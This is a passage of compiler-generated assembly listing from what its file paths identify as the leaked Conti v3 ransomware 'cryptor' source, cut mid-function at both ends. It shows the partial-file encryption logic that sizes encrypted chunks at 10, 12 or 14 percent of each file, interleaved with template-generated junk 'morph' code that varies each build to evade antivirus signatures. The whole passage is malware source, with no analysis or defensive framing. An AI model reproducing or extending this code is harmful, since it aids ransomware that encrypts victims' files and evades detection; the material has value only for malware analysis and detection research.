; 48   : 	if (_morph_var % 3) {

  007c5	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$5[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1024 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  007c8	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  007cc	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  007cf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1024 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  007d4	4c 8d 3c 92	 lea	 r15, QWORD PTR [rdx+rdx*4]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  007d8	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1024 : 		PartSize = (FileInfo->FileSize / 100) * 10;

  007da	4d 03 ff	 add	 r15, r15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  007dd	8b c2		 mov	 eax, edx
  007df	c1 e8 1f	 shr	 eax, 31
  007e2	03 d0		 add	 edx, eax
  007e4	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  007e7	3b c8		 cmp	 ecx, eax
  007e9	74 44		 je	 SHORT $LN589@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  007eb	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$5[rbp-81]
  007ee	83 c1 02	 add	 ecx, 2
  007f1	41 03 cf	 add	 ecx, r15d
  007f4	89 4d df	 mov	 DWORD PTR _morph_var$5[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  007f7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$5[rbp-81]
  007fa	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  007ff	7d 07		 jge	 SHORT $LN1198@EncryptPar
  00801	ff c8		 dec	 eax
  00803	83 c8 fc	 or	 eax, -4
  00806	ff c0		 inc	 eax
$LN1198@EncryptPar:
  00808	85 c0		 test	 eax, eax
  0080a	75 74		 jne	 SHORT $LN588@EncryptPar
  0080c	0f 1f 40 00	 npad	 4
$LL581@EncryptPar:
  00810	8b 45 df	 mov	 eax, DWORD PTR _morph_var$5[rbp-81]
  00813	ff c0		 inc	 eax
  00815	89 45 df	 mov	 DWORD PTR _morph_var$5[rbp-81], eax
  00818	8b 45 df	 mov	 eax, DWORD PTR _morph_var$5[rbp-81]
  0081b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00820	7d 07		 jge	 SHORT $LN1197@EncryptPar
  00822	ff c8		 dec	 eax
  00824	83 c8 fc	 or	 eax, -4
  00827	ff c0		 inc	 eax
$LN1197@EncryptPar:
  00829	85 c0		 test	 eax, eax
  0082b	74 e3		 je	 SHORT $LL581@EncryptPar

; 51   : 	}

  0082d	eb 51		 jmp	 SHORT $LN588@EncryptPar
$LN589@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0082f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$5[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00832	b9 02 00 00 00	 mov	 ecx, 2
  00837	8b 45 df	 mov	 eax, DWORD PTR _morph_var$5[rbp-81]
  0083a	41 2b cf	 sub	 ecx, r15d
  0083d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0083f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00844	89 4d df	 mov	 DWORD PTR _morph_var$5[rbp-81], ecx
  00847	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$5[rbp-81]
  0084a	f7 e9		 imul	 ecx
  0084c	8b c2		 mov	 eax, edx
  0084e	c1 e8 1f	 shr	 eax, 31
  00851	03 d0		 add	 edx, eax
  00853	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00856	3b c8		 cmp	 ecx, eax
  00858	75 26		 jne	 SHORT $LN588@EncryptPar
  0085a	66 0f 1f 44 00
	00		 npad	 6
$LL583@EncryptPar:
  00860	8b 45 df	 mov	 eax, DWORD PTR _morph_var$5[rbp-81]
  00863	ff c0		 inc	 eax
  00865	89 45 df	 mov	 DWORD PTR _morph_var$5[rbp-81], eax
  00868	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0086d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$5[rbp-81]
  00870	f7 e9		 imul	 ecx
  00872	8b c2		 mov	 eax, edx
  00874	c1 e8 1f	 shr	 eax, 31
  00877	03 d0		 add	 edx, eax
  00879	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0087c	3b c8		 cmp	 ecx, eax
  0087e	74 e0		 je	 SHORT $LL583@EncryptPar
$LN588@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1027 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00880	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  00884	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  00888	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0088b	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$6[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00892	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$6[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1027 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00895	48 99		 cdq
  00897	48 2b c2	 sub	 rax, rdx
  0089a	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  008a1	48 d1 f8	 sar	 rax, 1
  008a4	4c 8b e0	 mov	 r12, rax
  008a7	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  008ab	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  008b0	f7 e9		 imul	 ecx
  008b2	8b c2		 mov	 eax, edx
  008b4	c1 e8 1f	 shr	 eax, 31
  008b7	03 d0		 add	 edx, eax
  008b9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  008bc	3b c8		 cmp	 ecx, eax
  008be	74 52		 je	 SHORT $LN568@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  008c0	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$6[rbp-81]
  008c3	83 c1 02	 add	 ecx, 2
  008c6	41 03 cc	 add	 ecx, r12d
  008c9	89 4d df	 mov	 DWORD PTR _morph_var$6[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  008cc	8b 45 df	 mov	 eax, DWORD PTR _morph_var$6[rbp-81]
  008cf	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  008d4	7d 07		 jge	 SHORT $LN1195@EncryptPar
  008d6	ff c8		 dec	 eax
  008d8	83 c8 fc	 or	 eax, -4
  008db	ff c0		 inc	 eax
$LN1195@EncryptPar:
  008dd	85 c0		 test	 eax, eax
  008df	0f 85 4b 0b 00
	00		 jne	 $LN378@EncryptPar
  008e5	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL560@EncryptPar:
  008f0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$6[rbp-81]
  008f3	ff c0		 inc	 eax
  008f5	89 45 df	 mov	 DWORD PTR _morph_var$6[rbp-81], eax
  008f8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$6[rbp-81]
  008fb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00900	7d 07		 jge	 SHORT $LN1194@EncryptPar
  00902	ff c8		 dec	 eax
  00904	83 c8 fc	 or	 eax, -4
  00907	ff c0		 inc	 eax
$LN1194@EncryptPar:
  00909	85 c0		 test	 eax, eax
  0090b	74 e3		 je	 SHORT $LL560@EncryptPar

; 51   : 	}

  0090d	e9 1e 0b 00 00	 jmp	 $LN378@EncryptPar
$LN568@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00912	8b 45 df	 mov	 eax, DWORD PTR _morph_var$6[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00915	b9 02 00 00 00	 mov	 ecx, 2
  0091a	8b 45 df	 mov	 eax, DWORD PTR _morph_var$6[rbp-81]
  0091d	41 2b cc	 sub	 ecx, r12d
  00920	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00922	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00927	89 4d df	 mov	 DWORD PTR _morph_var$6[rbp-81], ecx
  0092a	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$6[rbp-81]
  0092d	f7 e9		 imul	 ecx
  0092f	8b c2		 mov	 eax, edx
  00931	c1 e8 1f	 shr	 eax, 31
  00934	03 d0		 add	 edx, eax
  00936	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00939	3b c8		 cmp	 ecx, eax
  0093b	0f 85 ef 0a 00
	00		 jne	 $LN378@EncryptPar
  00941	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL562@EncryptPar:
  00950	8b 45 df	 mov	 eax, DWORD PTR _morph_var$6[rbp-81]
  00953	ff c0		 inc	 eax
  00955	89 45 df	 mov	 DWORD PTR _morph_var$6[rbp-81], eax
  00958	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0095d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$6[rbp-81]
  00960	f7 e9		 imul	 ecx
  00962	8b c2		 mov	 eax, edx
  00964	c1 e8 1f	 shr	 eax, 31
  00967	03 d0		 add	 edx, eax
  00969	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0096c	3b c8		 cmp	 ecx, eax
  0096e	74 e0		 je	 SHORT $LL562@EncryptPar

; 55   : 	}

  00970	e9 bb 0a 00 00	 jmp	 $LN378@EncryptPar
$LN14@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1032 : 		PartSize = (FileInfo->FileSize / 100) * 12;

  00975	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  0097f	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  00983	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  00987	48 c1 fa 06	 sar	 rdx, 6
  0098b	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0098e	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$7[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00995	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$7[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1032 : 		PartSize = (FileInfo->FileSize / 100) * 12;

  00998	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  0099c	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0099f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1032 : 		PartSize = (FileInfo->FileSize / 100) * 12;

  009a4	4c 8d 3c 52	 lea	 r15, QWORD PTR [rdx+rdx*2]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  009a8	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1032 : 		PartSize = (FileInfo->FileSize / 100) * 12;

  009aa	49 c1 e7 02	 shl	 r15, 2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  009ae	8b c2		 mov	 eax, edx
  009b0	c1 e8 1f	 shr	 eax, 31
  009b3	03 d0		 add	 edx, eax
  009b5	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  009b8	3b c8		 cmp	 ecx, eax
  009ba	74 43		 je	 SHORT $LN547@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  009bc	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$7[rbp-81]
  009bf	83 c1 02	 add	 ecx, 2
  009c2	41 03 cf	 add	 ecx, r15d
  009c5	89 4d df	 mov	 DWORD PTR _morph_var$7[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  009c8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$7[rbp-81]
  009cb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  009d0	7d 07		 jge	 SHORT $LN1192@EncryptPar
  009d2	ff c8		 dec	 eax
  009d4	83 c8 fc	 or	 eax, -4
  009d7	ff c0		 inc	 eax
$LN1192@EncryptPar:
  009d9	85 c0		 test	 eax, eax
  009db	75 73		 jne	 SHORT $LN546@EncryptPar
  009dd	0f 1f 00	 npad	 3
$LL539@EncryptPar:
  009e0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$7[rbp-81]
  009e3	ff c0		 inc	 eax
  009e5	89 45 df	 mov	 DWORD PTR _morph_var$7[rbp-81], eax
  009e8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$7[rbp-81]
  009eb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  009f0	7d 07		 jge	 SHORT $LN1191@EncryptPar
  009f2	ff c8		 dec	 eax
  009f4	83 c8 fc	 or	 eax, -4
  009f7	ff c0		 inc	 eax
$LN1191@EncryptPar:
  009f9	85 c0		 test	 eax, eax
  009fb	74 e3		 je	 SHORT $LL539@EncryptPar

; 51   : 	}

  009fd	eb 51		 jmp	 SHORT $LN546@EncryptPar
$LN547@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  009ff	8b 45 df	 mov	 eax, DWORD PTR _morph_var$7[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00a02	b9 02 00 00 00	 mov	 ecx, 2
  00a07	8b 45 df	 mov	 eax, DWORD PTR _morph_var$7[rbp-81]
  00a0a	41 2b cf	 sub	 ecx, r15d
  00a0d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00a0f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a14	89 4d df	 mov	 DWORD PTR _morph_var$7[rbp-81], ecx
  00a17	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$7[rbp-81]
  00a1a	f7 e9		 imul	 ecx
  00a1c	8b c2		 mov	 eax, edx
  00a1e	c1 e8 1f	 shr	 eax, 31
  00a21	03 d0		 add	 edx, eax
  00a23	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00a26	3b c8		 cmp	 ecx, eax
  00a28	75 26		 jne	 SHORT $LN546@EncryptPar
  00a2a	66 0f 1f 44 00
	00		 npad	 6
$LL541@EncryptPar:
  00a30	8b 45 df	 mov	 eax, DWORD PTR _morph_var$7[rbp-81]
  00a33	ff c0		 inc	 eax
  00a35	89 45 df	 mov	 DWORD PTR _morph_var$7[rbp-81], eax
  00a38	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a3d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$7[rbp-81]
  00a40	f7 e9		 imul	 ecx
  00a42	8b c2		 mov	 eax, edx
  00a44	c1 e8 1f	 shr	 eax, 31
  00a47	03 d0		 add	 edx, eax
  00a49	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00a4c	3b c8		 cmp	 ecx, eax
  00a4e	74 e0		 je	 SHORT $LL541@EncryptPar
$LN546@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1035 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00a50	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  00a54	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  00a58	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00a5b	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$8[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00a62	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$8[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1035 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00a65	48 99		 cdq
  00a67	48 2b c2	 sub	 rax, rdx
  00a6a	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  00a71	48 d1 f8	 sar	 rax, 1
  00a74	4c 8b e0	 mov	 r12, rax
  00a77	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00a7b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a80	f7 e9		 imul	 ecx
  00a82	8b c2		 mov	 eax, edx
  00a84	c1 e8 1f	 shr	 eax, 31
  00a87	03 d0		 add	 edx, eax
  00a89	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00a8c	3b c8		 cmp	 ecx, eax
  00a8e	74 52		 je	 SHORT $LN526@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00a90	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$8[rbp-81]
  00a93	83 c1 02	 add	 ecx, 2
  00a96	41 03 cc	 add	 ecx, r12d
  00a99	89 4d df	 mov	 DWORD PTR _morph_var$8[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00a9c	8b 45 df	 mov	 eax, DWORD PTR _morph_var$8[rbp-81]
  00a9f	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00aa4	7d 07		 jge	 SHORT $LN1189@EncryptPar
  00aa6	ff c8		 dec	 eax
  00aa8	83 c8 fc	 or	 eax, -4
  00aab	ff c0		 inc	 eax
$LN1189@EncryptPar:
  00aad	85 c0		 test	 eax, eax
  00aaf	0f 85 7b 09 00
	00		 jne	 $LN378@EncryptPar
  00ab5	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL518@EncryptPar:
  00ac0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$8[rbp-81]
  00ac3	ff c0		 inc	 eax
  00ac5	89 45 df	 mov	 DWORD PTR _morph_var$8[rbp-81], eax
  00ac8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$8[rbp-81]
  00acb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00ad0	7d 07		 jge	 SHORT $LN1188@EncryptPar
  00ad2	ff c8		 dec	 eax
  00ad4	83 c8 fc	 or	 eax, -4
  00ad7	ff c0		 inc	 eax
$LN1188@EncryptPar:
  00ad9	85 c0		 test	 eax, eax
  00adb	74 e3		 je	 SHORT $LL518@EncryptPar

; 51   : 	}

  00add	e9 4e 09 00 00	 jmp	 $LN378@EncryptPar
$LN526@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00ae2	8b 45 df	 mov	 eax, DWORD PTR _morph_var$8[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00ae5	b9 02 00 00 00	 mov	 ecx, 2
  00aea	8b 45 df	 mov	 eax, DWORD PTR _morph_var$8[rbp-81]
  00aed	41 2b cc	 sub	 ecx, r12d
  00af0	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00af2	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00af7	89 4d df	 mov	 DWORD PTR _morph_var$8[rbp-81], ecx
  00afa	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$8[rbp-81]
  00afd	f7 e9		 imul	 ecx
  00aff	8b c2		 mov	 eax, edx
  00b01	c1 e8 1f	 shr	 eax, 31
  00b04	03 d0		 add	 edx, eax
  00b06	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00b09	3b c8		 cmp	 ecx, eax
  00b0b	0f 85 1f 09 00
	00		 jne	 $LN378@EncryptPar
  00b11	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL520@EncryptPar:
  00b20	8b 45 df	 mov	 eax, DWORD PTR _morph_var$8[rbp-81]
  00b23	ff c0		 inc	 eax
  00b25	89 45 df	 mov	 DWORD PTR _morph_var$8[rbp-81], eax
  00b28	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00b2d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$8[rbp-81]
  00b30	f7 e9		 imul	 ecx
  00b32	8b c2		 mov	 eax, edx
  00b34	c1 e8 1f	 shr	 eax, 31
  00b37	03 d0		 add	 edx, eax
  00b39	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00b3c	3b c8		 cmp	 ecx, eax
  00b3e	74 e0		 je	 SHORT $LL520@EncryptPar

; 55   : 	}

  00b40	e9 eb 08 00 00	 jmp	 $LN378@EncryptPar
$LN15@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1040 : 		PartSize = (FileInfo->FileSize / 100) * 14;

  00b45	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  00b4f	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  00b53	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  00b57	48 c1 fa 06	 sar	 rdx, 6
  00b5b	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00b5e	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$9[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00b65	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$9[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1040 : 		PartSize = (FileInfo->FileSize / 100) * 14;

  00b68	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  00b6c	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00b6f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1040 : 		PartSize = (FileInfo->FileSize / 100) * 14;

  00b74	4c 6b fa 0e	 imul	 r15, rdx, 14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00b78	f7 e9		 imul	 ecx
  00b7a	8b c2		 mov	 eax, edx
  00b7c	c1 e8 1f	 shr	 eax, 31
  00b7f	03 d0		 add	 edx, eax
  00b81	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00b84	3b c8		 cmp	 ecx, eax
  00b86	74 47		 je	 SHORT $LN505@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  00b88	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$9[rbp-81]
  00b8b	83 c1 02	 add	 ecx, 2
  00b8e	41 03 cf	 add	 ecx, r15d
  00b91	89 4d df	 mov	 DWORD PTR _morph_var$9[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00b94	8b 45 df	 mov	 eax, DWORD PTR _morph_var$9[rbp-81]
  00b97	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00b9c	7d 07		 jge	 SHORT $LN1186@EncryptPar
  00b9e	ff c8		 dec	 eax
  00ba0	83 c8 fc	 or	 eax, -4
  00ba3	ff c0		 inc	 eax
$LN1186@EncryptPar:
  00ba5	85 c0		 test	 eax, eax
  00ba7	75 77		 jne	 SHORT $LN504@EncryptPar
  00ba9	0f 1f 80 00 00
	00 00		 npad	 7
$LL497@EncryptPar:
  00bb0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$9[rbp-81]
  00bb3	ff c0		 inc	 eax
  00bb5	89 45 df	 mov	 DWORD PTR _morph_var$9[rbp-81], eax
  00bb8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$9[rbp-81]
  00bbb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00bc0	7d 07		 jge	 SHORT $LN1185@EncryptPar
  00bc2	ff c8		 dec	 eax
  00bc4	83 c8 fc	 or	 eax, -4
  00bc7	ff c0		 inc	 eax
$LN1185@EncryptPar:
  00bc9	85 c0		 test	 eax, eax
  00bcb	74 e3		 je	 SHORT $LL497@EncryptPar

; 51   : 	}

  00bcd	eb 51		 jmp	 SHORT $LN504@EncryptPar
$LN505@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  00bcf	8b 45 df	 mov	 eax, DWORD PTR _morph_var$9[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  00bd2	b9 02 00 00 00	 mov	 ecx, 2
  00bd7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$9[rbp-81]
  00bda	41 2b cf	 sub	 ecx, r15d
  00bdd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00bdf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00be4	89 4d df	 mov	 DWORD PTR _morph_var$9[rbp-81], ecx
  00be7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$9[rbp-81]
  00bea	f7 e9		 imul	 ecx
  00bec	8b c2		 mov	 eax, edx
  00bee	c1 e8 1f	 shr	 eax, 31
  00bf1	03 d0		 add	 edx, eax
  00bf3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00bf6	3b c8		 cmp	 ecx, eax
  00bf8	75 26		 jne	 SHORT $LN504@EncryptPar
  00bfa	66 0f 1f 44 00
	00		 npad	 6
$LL499@EncryptPar:
  00c00	8b 45 df	 mov	 eax, DWORD PTR _morph_var$9[rbp-81]
  00c03	ff c0		 inc	 eax
  00c05	89 45 df	 mov	 DWORD PTR _morph_var$9[rbp-81], eax
  00c08	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00c0d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$9[rbp-81]
  00c10	f7 e9		 imul	 ecx
  00c12	8b c2		 mov	 eax, edx
  00c14	c1 e8 1f	 shr	 eax, 31
  00c17	03 d0		 add	 edx, eax
  00c19	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00c1c	3b c8		 cmp	 ecx, eax
  00c1e	74 e0		 je	 SHORT $LL499@EncryptPar
$LN504@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1043 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00c20	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  00c24	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  00c28	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00c2b	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$10[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00c32	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$10[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1043 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  00c35	48 99		 cdq
  00c37	48 2b c2	 sub	 rax, rdx
  00c3a	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  00c41	48 d1 f8	 sar	 rax, 1
  00c44	4c 8b e0	 mov	 r12, rax
  00c47	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00c4b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00c50	f7 e9		 imul	 ecx
  00c52	8b c2		 mov	 eax, edx
  00c54	c1 e8 1f	 shr	 eax, 31
  00c57	03 d0		 add	 edx, eax
  00c59	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00c5c	3b c8		 cmp	 ecx, eax
  00c5e	74 52		 je	 SHORT $LN484@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

